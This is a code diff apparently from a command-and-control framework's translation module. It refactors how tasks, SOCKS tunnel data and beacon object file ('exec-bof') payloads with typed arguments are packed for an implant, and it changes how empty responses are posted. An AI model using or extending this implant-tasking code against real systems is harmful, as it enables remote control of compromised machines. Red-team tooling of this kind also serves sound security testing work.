@@ -13,72 +13,67 @@ def CheckinImp( uuid ):
 
     return Data;
 
-def RespTasking( Tasks, Socks ) -> bytes:
+def RespTasking(Tasks, Socks) -> bytes:
     Dbg3("------------------------")
 
-    Pkg     = Packer()
-    JobID   = Jobs["get_tasking"]["hex_code"]
-    SockPkg = Packer()
-    TaskLength = len(Tasks)
+    Pkg = Packer()
+    JobID = Jobs["get_tasking"]["hex_code"]
+    TaskLength = len(Tasks) + len(Socks)  # Total de tasks inclui Socks
 
     Dbg3(f"task quantity {TaskLength}")
 
+    # Start building main package
+    Pkg.Int8(JobID)
+    Pkg.Int32(TaskLength)
+
+    # Process and add each sock as separate package
     for Sock in Socks:
-        TaskLength += 1
+        # Create individual package for each sock
+        SockPkg = Packer()
+        
         SrvId = Sock["server_id"]
-        Data  = Sock["data"]
-        Ext   = Sock["exit"]
-
-        if Ext is False:
-            Ext = 0
-        else:
-            Ext = 1
-
+        Data = Sock["data"]
+        Ext = 1 if Sock["exit"] else 0  # Simplified boolean to int conversion
         TaskUUIDSck = "55555555-5555-5555-555-555555555555"
 
-        Dbg3( f"socks exit: {Ext}" )
-        Dbg3( f"socks id: {SrvId}" )
+        Dbg3(f"socks exit: {Ext}")
+        Dbg3(f"socks id: {SrvId}")
 
         if Data is not None:
-            Dbg3( f"socks data: {Data} [{len( Data )} bytes]" )
+            Dbg3(f"socks data: [{len(base64.b64decode(Data))} bytes]")
         
-        SockPkg.Int16( T_SOCKS )
-        SockPkg.Int32( Ext )
-        SockPkg.Int32( SrvId )
+        # Build sock package
+        SockPkg.Int16(T_SOCKS)
+        SockPkg.Int32(Ext)
+        SockPkg.Int32(SrvId)
 
         if Data is not None:
-            SockPkg.Bytes( Data.encode() )    
+            SockPkg.Bytes(Data.encode())
 
-        Dbg3( f"socks all buffer: {SockPkg.buffer} [{SockPkg.length} bytes]" )
+        # Add to main package
+        Pkg.Bytes(TaskUUIDSck.encode())
+        Pkg.Bytes(SockPkg.buffer)
 
-    Pkg.Int8( JobID )
-    Pkg.Int32( TaskLength )
-
-    for Sock in Socks:
-        Pkg.Bytes( TaskUUIDSck.encode() )
-        Pkg.Bytes( SockPkg.buffer )
-
+    # Add regular tasks
     for Task in Tasks:
-        Command  = Task["command"]
+        Command = Task["command"]
         TaskUUID = Task["id"].encode()
 
+        # Process parameters
         Parameters = {}
-        if Task["parameters"] is None or Task["parameters"] == "":
-            Parameters = {}
-        else:
+        if Task["parameters"]:
             try:
                 if isinstance(Task["parameters"], str):
                     Parameters = json.loads(Task["parameters"])
                 elif isinstance(Task["parameters"], dict):
                     Parameters = Task["parameters"]
-                else:
-                    Parameters = {}
             except (json.JSONDecodeError, TypeError):
                 Parameters = {}
 
         Pkg.Bytes(TaskUUID)
-        TaskPkg = Packer()
+        tsk_psr = Packer()
 
+        # Handle command and subcommand
         if "action" in Parameters:
             main_cmd = Command
             sub_cmd = Parameters["action"]
@@ -95,48 +90,95 @@ def RespTasking( Tasks, Socks ) -> bytes:
                 Dbg3(f"Command doesn't support subcommands: {main_cmd}")
                 continue
         else:
-            if Command in Commands:
-                CommandID = Commands[Command]['hex_code']
-                SubCommandID = 0
-            else:
+            CommandID = Commands[Command]['hex_code'] if Command in Commands else None
+            if not CommandID:
                 Dbg3(f"Unknown command: {Command}")
                 continue
+            SubCommandID = 0
 
-        TaskPkg.Int16(int(CommandID))
-        Dbg3( f"command id: {CommandID}" )
+        tsk_psr.Int16(int(CommandID))
+        Dbg3(f"command id: {CommandID}")
         
         if SubCommandID != 0:
-            TaskPkg.Int8(SubCommandID)
-            Dbg3( f"sub id: {SubCommandID}" )
+            tsk_psr.Int8(SubCommandID)
+            Dbg3(f"sub id: {SubCommandID}")
 
-        for Key, Val in Parameters.items():
-            if Key != "action":
-                try:
-                    hex_bytes = bytes.fromhex(Val)
-                    Dbg3(f"key: {Key} parameter with len: {len(hex_bytes)} [type: hex:bytes]")
-                    TaskPkg.Pad(hex_bytes)
-                except (ValueError, AttributeError, TypeError):
-                    if isinstance(Val, str):
-                        Dbg3(f"key: {Key} parameter: {Val} [type: str]")
-                        TaskPkg.Bytes(str(Val).encode())
-                    elif isinstance(Val, int):
-                        Dbg3(f"key: {Key} parameter: {int(Val)} [type: int]")
-                        TaskPkg.Int32(int(Val))
-                    elif isinstance(Val, bool):
-                        Dbg3(f"key: {Key} parameter: {int(Val)} [type: bool]")
-                        TaskPkg.Int32(int(Val))
-                    elif isinstance(Val, bytes):
-                        Dbg3(f"key: {Key} parameter: {len(Val)} [type: bytes]")
-                        TaskPkg.Pad(Val)
+        # Special handling for BOF command
+        if CommandID == Commands["exec-bof"]["hex_code"]:
+            args_buffer = Packer()
             
-        if SockPkg.buffer:
-            sock_data = SockPkg.buffer
-            Pkg.Bytes( sock_data )
+            if "bof_file" in Parameters:
+                try:
+                    file_bytes = bytes.fromhex(Parameters["bof_file"])
+                    tsk_psr.Bytes(file_bytes)
+                except Exception as e:
+                    Dbg3(f"Failed to process bof_file: {str(e)}")
+                    raise ValueError(f"Invalid bof_file content: {str(e)}")
+            
+            if "bof_id" in Parameters:
+                tsk_psr.Int32( Parameters["bof_id"] )
 
-        task_data = TaskPkg.buffer
+            if "bof_arguments" in Parameters and isinstance(Parameters["bof_arguments"], list):
+                Dbg3(f"Processing bof_arguments: {Parameters['bof_arguments']}")
+                for arg in Parameters["bof_arguments"]:
+                    try:
+                        if isinstance(arg, list) and len(arg) == 2:
+                            arg_type, value = arg
+                            Dbg3(f"Processing argument - type: {arg_type}, value: {value}")
+                            
+                            if arg_type == "int16":
+                                args_buffer.Int16(int(value))
+                            elif arg_type == "int32":
+                                args_buffer.Int32(int(value))
+                            elif arg_type == "bytes":
+                                args_buffer.Pad(bytes.fromhex(value))
+                            elif arg_type == "char":
+                                args_buffer.Bytes(str(value).encode("utf-8"))
+                            elif arg_type == "wchar":
+                                args_buffer.Bytes(str(value).encode("utf-16"))
+                            elif arg_type == "base64":
+                                try:
+                                    decoded = base64.b64decode(value)
+                                    args_buffer.Pad(decoded)
+                                except Exception:
+                                    Dbg3(f"Invalid base64: {value}")
+                                    raise ValueError(f"Invalid base64: {value}")
+                            else:
+                                Dbg3(f"Unknown argument type: {arg_type}")
+                                raise ValueError(f"Unknown argument type: {arg_type}")
+                        else:
+                            Dbg3(f"Invalid argument format: {arg}")
+                            raise ValueError(f"Invalid argument format: {arg}")
+                    except Exception as e:
+                        Dbg3(f"Failed to process argument {arg}: {str(e)}")
+                        raise ValueError(f"Failed to process argument {arg}: {str(e)}")
+            
+            tsk_psr.Int32(args_buffer.length) 
+            tsk_psr.Pad(args_buffer.buffer) 
+        else:
+            # Handle regular parameters
+            for Key, Val in Parameters.items():
+                if Key != "action":
+                    try:
+                        hex_bytes = bytes.fromhex(Val)
+                        Dbg3(f"key: {Key} | parameter with len: {len(hex_bytes)} [type: hex:bytes]")
+                        tsk_psr.Pad(hex_bytes)
+                    except (ValueError, AttributeError, TypeError):
+                        if isinstance(Val, str):
+                            Dbg3(f"key: {Key} | parameter: {Val} [type: str]")
+                            tsk_psr.Bytes(str(Val).encode())
+                        elif isinstance(Val, int):
+                            Dbg3(f"key: {Key} | parameter: {int(Val)} [type: int]")
+                            tsk_psr.Int32(int(Val))
+                        elif isinstance(Val, bool):
+                            Dbg3(f"key: {Key} | parameter: {int(Val)} [type: bool]")
+                            tsk_psr.Int32(int(Val))
+                        elif isinstance(Val, bytes):
+                            Dbg3(f"key: {Key} | parameter: {len(Val)} [type: bytes]")
+                            tsk_psr.Pad(Val)
 
-        Dbg3(f"task uuid: {TaskUUID} with [{len(task_data)} bytes]")
-        Pkg.Bytes(task_data)
+        Pkg.Bytes(tsk_psr.buffer)
+        Dbg3(f"task uuid: {TaskUUID} with [{len(tsk_psr.buffer)} bytes]")
 
     Dbg3("------------------------")
     return Pkg.buffer
@@ -144,13 +186,13 @@ def RespTasking( Tasks, Socks ) -> bytes:
 def RespPosting( Responses ):
     Dbg2( "------------------------" );
 
-    if not Responses:
-        Dbg2("No responses to post.")
-        return b""
-
     Dbg2( f"responses: {Responses}" );
 
     Data = len( Responses ).to_bytes( 4, "big" );
+    
+    if not Responses:
+        Dbg2("No responses to post.")
+        return Data
 
     Pkg = Packer();
 
